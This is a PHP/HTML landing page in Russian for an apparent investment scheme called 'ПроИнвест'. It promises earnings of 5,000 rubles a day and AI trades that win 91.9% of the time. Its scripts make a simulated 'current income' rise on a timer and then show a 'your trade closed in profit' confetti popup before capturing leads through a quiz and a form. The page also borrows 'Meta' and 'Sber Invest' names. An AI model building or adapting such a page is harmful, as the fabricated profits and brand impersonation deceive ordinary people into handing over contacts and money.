<?php
// if (!isset($rawClick) && !isset($click)) {
//     die();
// }
?>

<?php
//CONFIG FILE WITH PARAMS
include_once dirname(__FILE__) . '/config.php';
?>
<!DOCTYPE html>
<html lang="ru">
  <head>
    <script src="js/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.0.1/dist/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-luxon@1.0.0"></script>
    <script src="js/chartjs-chart-financial.js" type="text/javascript"></script>

    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
    <meta name="facebook-domain-verification" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache" />
    <title>Meta</title>
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="css/main.css" />
    <link rel="stylesheet" href="css/form.css" />

    <style>
      #button_next {
        transition: transform 0.3s ease-in-out;
        animation: pulsate 1s infinite alternate;
      }

      @keyframes pulsate {
        0% {
          transform: scale(1);
        }
        100% {
          transform: scale(1.05);
        }
      }

      .register-form__list {
        margin: 15px auto 0;
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 10px;
        padding: 0 !important;
      }
      .register-form__item {
        display: flex;
        align-items: center;
        gap: 5px;
      }
      .register-form__img {
        position: relative;
        width: 60px;
        height: 35px;
      }
      .register-form__img img {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
    </style>
    <style>
      #preloaderDiv {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        z-index: 99999;
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }

      #preloaderDiv .preloaderLines {
        display: flex;
      }

      .preloaderText {
        color: #000000;
        font-size: 20px;
        text-align: center;
        font-family: inherit;
        letter-spacing: 1px;
        margin: 0px 0 5px;
      }

      #preloaderDiv .line {
        width: 5px;
        height: 15px;
        background: #fff;
        margin: 0 3px;
        display: inline-block;
        animation: opacity-1 1000ms infinite ease-in-out;
      }

      #preloaderDiv .line-1 {
        animation-delay: 800ms;
      }

      #preloaderDiv .line-2 {
        animation-delay: 600ms;
      }

      #preloaderDiv .line-3 {
        animation-delay: 400ms;
      }

      #preloaderDiv .line-4 {
        animation-delay: 200ms;
      }

      #preloaderDiv .line-6 {
        animation-delay: 200ms;
      }

      #preloaderDiv .line-7 {
        animation-delay: 400ms;
      }

      #preloaderDiv .line-8 {
        animation-delay: 600ms;
      }

      #preloaderDiv .line-9 {
        animation-delay: 800ms;
      }

      @keyframes opacity-1 {
        0% {
          opacity: 1;
        }
        50% {
          opacity: 0;
        }
        100% {
          opacity: 1;
        }
      }
    </style>
    <style>
      #calculator p {
        font-size: 16px;
      }

      #calculator h1 {
        font-size: 35px;
      }

      #calculator h2 {
        font-size: 30px;
      }

      #calculator h3 {
        font-size: 28px;
      }

      #calculator h4 {
        font-size: 25px;
      }

      #calculator h1,
      #calculator h2,
      #calculator h3,
      #calculator h4,
      #calculator h5,
      #calculator p,
      #calculator span,
      #calculator i {
        color: rgba(18, 18, 18, 0.7);
        margin: 5px 0 15px 0;
      }

      #calculator .row {
        position: relative;
        display: flex;
        flex-flow: row;
        margin-bottom: 15px;
        flex-wrap: wrap;
      }

      #calculator .column {
        position: relative;
        display: flex;
        flex-flow: column;
        padding: 15px;
        flex: 1;
        width: 100%;
      }

      #calculator .column.half {
        width: 50%;
      }

      #calculator .column.centered {
        justify-content: center;
        align-items: center;
      }

      #calculator .background-blue-gray {
        background-color: #f9f9f9;
      }
      @media screen and (max-width: 600px) {
        #calculator .background-blue-gray {
          background-color: transparent;
        }
      }

      #calculator button#cta,
      #calculator a#cta {
        padding: 10px 1.5em;
        background-color: #51a351;
        font-size: 25px;
        font-weight: 500;
        color: white;
        appearance: none;
        border: none;
        transition: all 300ms ease-in-out;
      }

      #calculator button#cta:hover,
      #calculator a#cta:hover {
        scale: 1.05;
        transition: all 300ms ease-in-out;
      }

      #calculator button#cta.bordered,
      #calculator a#cta.bordered {
        border-radius: 10px;
      }

      #calculator .calculated-value {
        border: none;
        background-color: transparent;
        color: white;
        font-size: 30px;
        font-weight: 600;
      }

      #calculator .calculated-value > i.usd-icon {
        font-size: 30px;
        font-weight: 600;
        vertical-align: middle;
      }

      #calculator .calculated-value > span {
        font-size: 30px;
        font-weight: 600;
        vertical-align: middle;
      }

      #calculator .column.border-left > span.border {
        height: 80%;
        width: 1px;
        content: "";
        background-color: gray;
        position: absolute;
        left: 0;
        top: 50%;
        transform: translateY(-50%);
        display: block;
        z-index: 1;
      }

      #calculator .minimum-deposit {
        font-size: 20px;
        color: gray;
      }

      @media (max-width: 996px) {
        #calculator .column.half {
          width: 100%;
          flex-basis: 100%;
        }

        #calculator .column.border-left > span.border {
          height: 1px;
          width: 80%;
          top: 0;
          transform: translateX(-50%);
          left: 50%;
        }

        #calculator .hide-mobile {
          display: none;
        }

        #calculator .minimum-deposit {
          text-align: center;
          margin: 0;
        }

        #calculator input[type="range"] {
          padding-top: 0;
        }
      }

      #calculator .color-primary {
        color: #0051ff;
      }

      #calculator .pa20 {
        padding: 20px !important;
      }

      #calculator .pt0-mobile {
        padding-top: 0 !important;
      }
      input[type="range"]#initial-investments {
        -webkit-appearance: none;
      }

      /*progress support*/
      input[type="range"]#initial-investments {
        --range: calc(var(--max) - var(--min));
        --ratio: calc((var(--value) - var(--min)) / var(--range));
        --sx: calc(0.5 * 2em + var(--ratio) * (100% - 2em));
      }

      input[type="range"]#initial-investments:focus {
        outline: none;
      }

      /*webkit*/
      input[type="range"]#initial-investments::-webkit-slider-thumb {
        -webkit-appearance: none;
        width: 2em;
        height: 2em;
        border-radius: 1em;
        background: #51a351;
        border: none;
        box-shadow: 0 0 2px black;
        margin-top: calc(max((1em - 1px - 1px) * 0.5, 0px) - 2em * 0.5);
      }

      input[type="range"]#initial-investments::-webkit-slider-runnable-track {
        height: 1em;
        border: 1px solid #b2b2b2;
        border-radius: 0.5em;
        background: #efefef;
        box-shadow: none;
      }

      input[type="range"]#initial-investments::-webkit-slider-thumb:hover {
        background: #51a351;
      }

      input[type="range"]#initial-investments:hover::-webkit-slider-runnable-track {
        background: #e5e5e5;
        border-color: #9a9a9a;
      }

      input[type="range"]#initial-investments::-webkit-slider-thumb:active {
        background: #51a351;
      }

      input[type="range"]#initial-investments:active::-webkit-slider-runnable-track {
        background: #f5f5f5;
        border-color: #c1c1c1;
      }

      input[type="range"]#initial-investments::-webkit-slider-runnable-track {
        background: linear-gradient(#51a351, #51a351) 0 / var(--sx) 100%
            no-repeat,
          #efefef;
      }

      input[type="range"]#initial-investments:hover::-webkit-slider-runnable-track {
        background: linear-gradient(#51a351, #51a351) 0 / var(--sx) 100%
            no-repeat,
          #e5e5e5;
      }

      input[type="range"]#initial-investments:active::-webkit-slider-runnable-track {
        background: linear-gradient(#51a351, #51a351) 0 / var(--sx) 100%
            no-repeat,
          #f5f5f5;
      }

      /*mozilla*/
      input[type="range"]#initial-investments::-moz-range-thumb {
        width: 2em;
        height: 2em;
        border-radius: 1em;
        background: #51a351;
        border: none;
        box-shadow: 0 0 2px black;
      }

      input[type="range"]#initial-investments::-moz-range-track {
        height: max(calc(1em - 1px - 1px), 0px);
        border: 1px solid #b2b2b2;
        border-radius: 0.5em;
        background: #efefef;
        box-shadow: none;
      }

      input[type="range"]#initial-investments::-moz-range-thumb:hover {
        background: #51a351;
      }

      input[type="range"]#initial-investments:hover::-moz-range-track {
        background: #e5e5e5;
        border-color: #9a9a9a;
      }

      input[type="range"]#initial-investments::-moz-range-thumb:active {
        background: #51a351;
      }

      input[type="range"]#initial-investments:active::-moz-range-track {
        background: #f5f5f5;
        border-color: #c1c1c1;
      }

      input[type="range"]#initial-investments::-moz-range-track {
        background: linear-gradient(#51a351, #51a351) 0 / var(--sx) 100%
            no-repeat,
          #efefef;
      }

      input[type="range"]#initial-investments:hover::-moz-range-track {
        background: linear-gradient(#51a351, #51a351) 0 / var(--sx) 100%
            no-repeat,
          #e5e5e5;
      }

      input[type="range"]#initial-investments:active::-moz-range-track {
        background: linear-gradient(#51a351, #51a351) 0 / var(--sx) 100%
            no-repeat,
          #f5f5f5;
      }

      /*ms*/
      input[type="range"]#initial-investments::-ms-fill-upper {
        background: transparent;
        border-color: transparent;
      }

      input[type="range"]#initial-investments::-ms-fill-lower {
        background: transparent;
        border-color: transparent;
      }

      input[type="range"]#initial-investments::-ms-thumb {
        width: 2em;
        height: 2em;
        border-radius: 1em;
        background: #51a351;
        border: none;
        box-shadow: 0 0 2px black;
        margin-top: 0;
        box-sizing: border-box;
      }

      input[type="range"]#initial-investments::-ms-track {
        height: 1em;
        border-radius: 0.5em;
        background: #efefef;
        border: 1px solid #b2b2b2;
        box-shadow: none;
        box-sizing: border-box;
      }

      input[type="range"]#initial-investments::-ms-thumb:hover {
        background: #51a351;
      }

      input[type="range"]#initial-investments:hover::-ms-track {
        background: #e5e5e5;
        border-color: #9a9a9a;
      }

      input[type="range"]#initial-investments::-ms-thumb:active {
        background: #51a351;
      }

      input[type="range"]#initial-investments:active::-ms-track {
        background: #f5f5f5;
        border-color: #c1c1c1;
      }

      input[type="range"]#initial-investments:-ms-fill-lower {
        height: max(calc(1em - 1px - 1px), 0px);
        border-radius: 0.5em 0 0 0.5em;
        margin: -1px 0 -1px -1px;
        background: #51a351;
        border: 1px solid #b2b2b2;
        border-right-width: 0;
      }

      input[type="range"]#initial-investments:hover::-ms-fill-lower {
        background: #51a351;
        border-color: #9a9a9a;
      }

      input[type="range"]#initial-investments:active::-ms-fill-lower {
        background: #51a351;
        border-color: #c1c1c1;
      }
    </style>
    
    <style>
        /* Стиль для попапа */
        .popup {
            display: none; /* Скрыт по умолчанию */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            border-radius: 15px;
        }
        .overlay {
            display: none; /* Скрыт по умолчанию */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
            overflow: hidden;
        }
        .popup button {
            margin-top: 10px;
        }
        .step {
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.5s ease, visibility 0.5s ease;
  }

  .step.active {
    opacity: 1;
    visibility: visible;
  }
    </style>

    <script src="jquery-3.6.1.min.js"></script>

     <script type="application/javascript" src="track.js?v=21238"></script> 
     

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
          setCookie("_subid", subid);
        });
      }
      
      // Получаем значение 'subid' из куки
      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}",
      };
      
      
    </script>
    
    <script type="application/javascript" src="parse_url.js?v=19"></script> 
    
    
  </head>

  <body style="background-color: #fff;"
    class="add-scroll expansion-alids-init"
    data-new-gr-c-s-check-loaded="14.1111.0"
    data-gr-ext-installed=""
  >
    <div class="body" style="transform: translateY(0px)">
      <div class="content">
        <div class="header">
          <div class="header__body">
            <div class="header__name">
              <div class="header__avatar">
                <img src="unnamed.webp" alt="" />
              </div>
              <div class="header__desc">
                <span class="header__desc-name">ПроИнвест</span>
                <p>
                  С помощью наших технологий каждый житель России может
                  зарабатывать от 5.000 рублей в день!
                </p>
              </div>
            </div>
          </div>
        </div>

        <div class="chat">

          <div class="chart-wrapper" style="width: 100%; display: flex; align-items: center; justify-content: center;">
            <canvas id="chart"></canvas>
          </div>
          <p style="margin-top: 20px; font-family:'OktaNeue'; ">
              Алгоритмы компании "ПроИнвест" анализирует рынок в
              режиме онлайн, а технологии исскуственного интеллекта позволяют
              заключать прибыльные сделки в 91.9% случаев.
            </p>
          <div class="user-profit" style="margin: 20px">
            <p style="text-align: center; font-size: 16px;">Ваш текущий доход:</p>
            <p
              style="
                color: green;
                font-size: 24px;
                font-family: 'OktaNeue';
                text-align: center;
                margin-top: 10px;
              "
            >
              <span id="profit">0 </span> Рублей
            </p>
          </div>
          <div id="lead" style="display: flex; flex-direction: column;align-items: center;">
            <button id="button_next" class="submit_btn" style="margin-top: 8px">
              Попробовать
            </button>
            
            
            <div class="overlay">
              <div class="container-confetti">
            <img
              src="./images/confettiL.png"
              alt="Confetti Left"
              class="confetti confetti--left"
            />
            <img
              src="./images/confettiR.png"
              alt="Confetti Right"
              class="confetti confetti--right"
            />
          </div>
            </div>
            <div class="popup">
                <!--<h2 style="text-align: center;">Ответьте на вопросы</h2>-->

                <div id="step0" class="step">
                    <p style="text-align: center;font-size: 24px;margin-bottom: 12px;">Поздравляем! <br> Ваша сделка закрылась в плюс!</p>
                    
                    <div style="display: flex;justify-content: center;">
                      <button class="btn" style="width: 80%;background-color: #51a351;height:40px;font-size: 18px;" onclick="goToStep1()">Продолжить</button>
                    </div>
                </div>

                <div id="step1" class="step" style="display: none;">
                    <p style="text-align: center;font-size: 24px;margin-bottom: 12px;">Вам есть 18 лет?</p>
                    
                    <div style="display: flex;justify-content: space-between;">
                      <button id="ageYes" class="btn" style="width: 47%;background-color: #51a351;height:40px;font-size: 18px;" onclick="goToStep2('Да')">Да</button>
                      <button id="ageNo" class="btn" style="width: 47%;background-color: #51a351;height:40px;font-size: 18px;" onclick="goToStep2('Нет')">Нет</button>
                    </div>
                </div>
            
                <div id="step2" class="step" style="display:none;">
                    <p style="text-align: center;font-size: 24px;margin-bottom: 12px;">Есть ли у Вас гражданство?</p>
                    <div style="display: flex;justify-content: space-between;">
                      <button id="citizenYes" class="btn" style="width: 47%;background-color: #51a351;height:40px;font-size: 18px;" onclick="submitQuiz('Да')">Да</button>
                      <button id="citizenNo" class="btn" style="width: 47%;background-color: #51a351;height:40px;font-size: 18px;" onclick="submitQuiz('Нет')">Нет</button>
                    
                    </div>
                </div>
            
                <div id="resultMessage" style="display:none;"></div>
            </div>
          
          

            <form
              class="form _main-form contact-form register-form"
              id="main-form"
              method="post"
              style="margin-top: 5px;"
            ></form>
            <div class="form-video">
              <h2 class="video-title" style="display: none; font-size: 18px">Также рекомендуем ознакомиться с видео</h2>
              <iframe class="embedly-embed" src="https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fplayer.vimeo.com%2Fvideo%2F891391828%3Fapp_id%3D122963&dntp=1&display_name=Vimeo&url=https%3A%2F%2Fvimeo.com%2F891391828&image=https%3A%2F%2Fi.vimeocdn.com%2Fvideo%2F1764041730-cda251526f4113ba5f113d0ce1aa9787ef3500a9eb5cc247c0e54e774a213bbe-d_1280&key=96f1f04c5f4143bcb0f2e68c87d65feb&type=text%2Fhtml&schema=vimeo" width="375" height="200" scrolling="no" allowfullscreen="" title="Sber Invest" style="display: none">
                </iframe>
            </div>
          </div>
        </div>
      </div>
      <style>
        @keyframes confetti-left-animation {
  0% {
    transform: scale(0.5) translateY(-50px);
    opacity: 0;
  }
  100% {
    opacity: 1;
    transform: scale(1) translateY(50px);
  }
}

@keyframes confetti-right-animation {
  0% {
    transform: scale(0.5) translateY(-50px);
    opacity: 0;
  }

  100% {
    opacity: 1;
    transform: scale(1) translateY(50px);
  }
}

.embedly-embed {
  margin-top: 20px;
}

.form-video {
display: flex; 
flex-direction: column;
align-items: center;
margin-top: 30px;
}

.container-confetti {
  position: absolute;
  left: 50%;
  transform: translate(-50%, -50%);
  pointer-events: none;
  z-index: 0;
}

.confetti {
  opacity: 0;
  position: absolute;
  width: 400px;
  transform: scale(0.5) translateY(-50px), opacity 0.5s ease;
}

.confetti--left__animate {
  animation: confetti-left-animation 1s ease-out forwards;
}
.confetti--right__animate {
  animation: confetti-right-animation 1s ease-out forwards;
}
.confetti--left {
  left: -400px;
}

.confetti--right {
  right: -400px;
}
@media (max-width: 600px) {
.confetti--left {
  left: -300px;
}

.confetti--right {
  right: -300px;
}
}
@media (min-width: 1390px) {
  .confetti {
    width: 500px;
  }
.confetti--left {
  left: -500px;
}

.confetti--right {
  right: -500px;
}
}

        </style>
      <style>
        .form_message.error.inactive {
          display: none;
        }

        .form_message.error.active {
          display: block;
        }
      </style>

      <!-- <script src="js/main.js"></script> -->

      <style>
        .error {
          background-color: rgba(255, 0, 0, 0.5) !important;
          color: #fff !important;
        }

        .error::placeholder {
          color: #fff !important;
        }

        .valid {
          background-color: rgba(0, 255, 0, 0.5) !important;
        }

        .modal_phone {
          opacity: 1;
          position: fixed;
          top: 0;
          bottom: 0;
          right: 0;
          left: 0;
          z-index: 99999;
          display: none;
          outline: 0;
          padding-right: 15px;
          justify-content: center;
          align-items: center;
          background-color: rgba(0, 0, 0, 0.4);
          overflow-x: hidden;
          overflow-y: auto;
          color: #000;
        }

        .modal_phone.open_phone {
          display: flex;
        }

        .modal-open_phone {
          overflow: hidden;
        }

        .modal-dialog_phone {
          position: relative;
          width: 100%;
          max-width: 32rem;
          padding: 1rem;
          box-sizing: border-box;
        }

        .modal-content_phone {
          display: flex;
          flex-direction: column;
          pointer-events: auto;
          background-color: #fff;
          background-clip: padding-box;
          border: 1px solid rgba(0, 0, 0, 0.2);
          border-radius: 0.3rem;
          outline: 0;
        }

        .modal-header_phone {
          display: flex;
          align-items: center;
          padding: 1rem 1rem;
        }

        .modal-header_phone {
          justify-content: space-between;
          border-top-left-radius: 0.3rem;
          border-top-right-radius: 0.3rem;
        }

        .modal-body_phone {
          position: relative;
          flex: 1 1 auto;
          padding: 1rem;
        }

        .modal-title_phone {
          font-size: 1.25rem;
          font-weight: 600;
        }

        .close-button_phone {
          font-size: 1.5rem;
          font-weight: 700;
          line-height: 1;
          opacity: 0.5;
          background-color: transparent;
          border: 0;
          cursor: pointer;
          padding: 1rem 1rem;
          margin: -1rem -1rem -1rem auto;
        }
      </style>

      <!-- <script type="text/javascript" src="js/slick-min_3b62_2.js"></script> -->
      <script src="js/popper.min.js" crossorigin="anonymous"></script>
      <script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
      <script src="js/utils.min.js"></script>
      <link rel="stylesheet" href="css/intlTelInput.css" />
      <link rel="stylesheet" href="css/toastr.css" />

      <link rel="stylesheet" href="css/toastr.css" />
      <script type="text/javascript" src="js/index.js?v=1.3"></script>
      <script type="text/javascript" src="js/timer.js"></script>
      <script type="text/javascript">
    // Интервал для обновления данных
    window.setInterval(randomUpdate, 1000);

    // Находим кнопку по ID и добавляем обработчик клика
    document.getElementById("button_next").addEventListener("click", function () {
        // Меняем внутренний текст кнопки
        updateParams("sub_id_17=gain_money");
        this.innerText = "Рассчитываем прибыль...";

        // Запуск расчета прибыли
        window.setInterval(updateProfit, 1000);

        // Через 5 секунд показываем квиз
        window.setTimeout(showQuiz, 5500);
    });

    const confettiLeft = document.querySelector(".confetti--left");
  const confettiRight = document.querySelector(".confetti--right");

    document.getElementById("main-form").addEventListener("click", function () {
        window.setTimeout(openLeadForm, 500);
        window.setInterval(updateProfit, 2000);
    });

    // Переменные для хранения выбранных ответов
    var ageAnswer = null;
    var citizenAnswer = null;

    // Функция для показа квиза
function showQuiz() {
    document.querySelector('.popup').style.display = 'block'; // Показываем попап квиза
    document.querySelector('.overlay').style.display = 'block';
    document.getElementById('step0').style.display = 'block'; // Показываем нулевой шаг квиза
    const step0 = document.getElementById('step0');
    step0.style.display = 'block'; // Show step 0
    step0.classList.add('active'); 
    confettiLeft.style.opacity = "1";
    confettiRight.style.opacity = "1";
    confettiLeft.classList.add("confetti--left__animate");
    confettiRight.classList.add("confetti--right__animate");
}

// Функция для перехода к первому шагу
function goToStep1() {
  confettiLeft.style.display = "none";
    confettiRight.style.display = "none";

    // document.getElementById('step0').style.display = 'none'; // Скрываем нулевой шаг
    // document.getElementById('step1').style.display = 'block'; // Показываем первый шаг

    toggleSteps('step0', 'step1');
}

// Функция для перехода ко второму шагу
function goToStep2(value) {
    ageAnswer = value; // Сохраняем ответ

    // document.getElementById('step1').style.display = 'none'; // Скрываем первый шаг
    // document.getElementById('step2').style.display = 'block'; // Показываем второй шаг

     toggleSteps('step1', 'step2');
}

    // Функция для отправки квиза и проверки ответов
    function submitQuiz(value) {
        citizenAnswer = value; // Сохраняем ответ

        // Проверяем оба ответа
        if (ageAnswer === "Нет" || citizenAnswer === "Нет") {
            window.removeEventListener("beforeunload", trackClose);
            window.location.href = "err.html";
            localStorage.setItem('unsuitable', false);
        } else {
            openLeadForm(); // Показываем форму регистрации только если оба ответа "Да"
            closeQuiz();
        }
    }

    // Функция для закрытия квиза
    function closeQuiz() {
        document.querySelector('.popup').style.display = 'none';
        document.querySelector('.overlay').style.display = 'none';
    }

// Функция для плавного перехода между вопросами 
function toggleSteps(currentStepId, nextStepId) {
    const currentStep = document.getElementById(currentStepId);
    const nextStep = document.getElementById(nextStepId);

    currentStep.classList.remove('active'); 
    setTimeout(() => {
        currentStep.style.display = 'none'; 
        nextStep.style.display = 'block'; 
        setTimeout(() => {
            nextStep.classList.add('active');
        }, 10); 
    }, 500); 
}

    // Пример структуры квиза
    function openLeadForm() {
        var formElement = document.getElementById('fm');
        const videoTitle = document.querySelector(".video-title");
        const video = document.querySelector('.embedly-embed');
        
        document.getElementById("button_next").style.display = "none";
        formElement.style.display = 'block';
        formElement.style.borderTop = "1px solid #cdcdcd";
        formElement.style.paddingTop = '10px';

        videoTitle.style.display = "block";
        video.style.display = "block";

        // Прокрутка к форме
        formElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
</script>


    </div>

    <script>
      for (let e of document.querySelectorAll(
        'input[type="range"].initial-investments'
      )) {
        e.style.setProperty("--value", e.value);
        e.style.setProperty("--min", e.min == "" ? "0" : e.min);
        e.style.setProperty("--max", e.max == "" ? "100" : e.max);
        e.addEventListener("input", () =>
          e.style.setProperty("--value", e.value)
        );
      }
    </script>

    <script src="loadAssets.js?v=332119"></script>
    
    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>
    
    
    
    <script type="application/javascript">
      function getSubId() {
      if (!'{subid}'.match('{')) {
      localStorage.setItem('subid', '{subid}')
      return '{subid}';
      }
      
      }
      getSubId()
  </script>
  
  
  </body>
</html>
